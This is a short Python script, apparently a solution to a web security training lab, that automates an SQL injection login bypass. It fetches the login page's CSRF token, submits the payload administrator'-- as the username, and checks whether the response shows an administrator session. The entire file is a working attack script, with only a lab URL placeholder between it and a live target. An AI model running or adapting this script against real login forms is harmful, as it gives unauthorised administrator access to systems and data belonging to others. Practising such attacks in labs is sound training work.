#!/usr/bin/env python3

import requests
import re

# CHANGE THIS
TARGET = "YOUR.LAB.URL"

def get_csrf(session):
    r = session.get(TARGET + "/login")

    # Extract CSRF token
    match = re.search(r'name="csrf" value="(.+?)"', r.text)
    if match:
        csrf = match.group(1)
        print(f"[+] CSRF Token: {csrf}")
        return csrf

    print("[-] CSRF token not found")
    return None


def login_bypass():
    session = requests.Session()

    csrf = get_csrf(session)
    if not csrf:
        return

    payload = "administrator'--"

    data = {
        "csrf": csrf,
        "username": payload,
        "password": "anything"
    }

    print(f"[+] Trying payload: {payload}")

    r = session.post(TARGET + "/login", data=data)

    print(f"[+] Status Code: {r.status_code}")
    print(f"[+] Response Length: {len(r.text)}")

    if "log out" in r.text.lower() or "my account" in r.text.lower():
        print("[+] SUCCESS: Logged in as administrator 🎯")
    else:
        print("[-] Login failed")

    print("\n--- RESPONSE SNIPPET ---")
    print(r.text[:500])


if __name__ == "__main__":
    login_bypass()